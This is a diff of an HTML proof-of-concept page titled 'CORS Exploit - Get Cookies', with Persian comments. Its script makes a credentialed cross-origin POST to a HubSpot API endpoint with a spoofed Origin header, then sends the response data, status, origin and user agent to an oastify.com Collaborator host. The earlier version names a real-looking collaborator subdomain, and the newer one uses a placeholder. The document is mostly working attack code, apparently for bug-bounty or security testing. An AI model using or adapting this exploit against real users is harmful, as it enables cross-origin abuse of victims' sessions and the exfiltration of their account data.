@@ -1,15 +1,15 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Loading...</title>
+    <title>CORS Exploit - Get Cookies</title>
 </head>
 <body>
-    <h1>Please wait...</h1>
+    <h1>Loading...</h1>
     <script>
-    // درخواست به API هاب‌اسپات با کوکی‌های کاربر
+    // درخواست به هاب‌اسپات با کوکی‌ها
     fetch('https://app.hubspot.com/api/usage-logging/v1/log/hublytics-multi/no-auth', {
         method: 'POST',
-        credentials: 'include',  // کوکی‌ها همراه درخواست میرن
+        credentials: 'include',
         headers: {
             'Content-Type': 'application/json',
             'Origin': 'https://zeynaal.github.io'
@@ -23,30 +23,34 @@
         }])
     })
     .then(response => {
-        // دریافت پاسخ از سرور
-        return response.text();
+        // گرفتن کوکی از هدر درخواست (اینجا نمی‌شه، ولی کوکی همراه درخواست رفته)
+        // برگردوندن پاسخ به Collaborator
+        return response.text().then(data => {
+            return { status: response.status, data: data };
+        });
     })
-    .then(data => {
-        // ارسال پاسخ به Collaborator شما
-        fetch('https://1uwsoqvx198y1ot2gzpz6vpft6zxnobd.oastify.com', {
+    .then(result => {
+        // ارسال به Collaborator
+        fetch('https://YOUR_COLLABORATOR.oastify.com', {
             method: 'POST',
-            mode: 'no-cors',
+            mode: 'cors',  // مهم: با cors بفرست تا هدرها بیاد
             headers: {
                 'Content-Type': 'application/json'
             },
             body: JSON.stringify({
-                response: data,
+                response: result.data,
+                status: result.status,
                 origin: window.location.origin,
                 userAgent: navigator.userAgent,
-                timestamp: new Date().toISOString()
+                // اینجا کوکی رو نمی‌تونیم ببینیم، ولی می‌دونیم که همراه درخواست رفته
+                note: 'Cookies were sent with the request (HttpOnly). Check Burp Suite for the Cookie header.'
             })
         });
     })
     .catch(error => {
-        // اگر خطایی رخ داد، به Collaborator اطلاع بده
-        fetch('https://https://1uwsoqvx198y1ot2gzpz6vpft6zxnobd.oastify.com', {
+        fetch('https://YOUR_COLLABORATOR.oastify.com', {
             method: 'POST',
-            mode: 'no-cors',
+            mode: 'cors',
             headers: {
                 'Content-Type': 'application/json'
             },
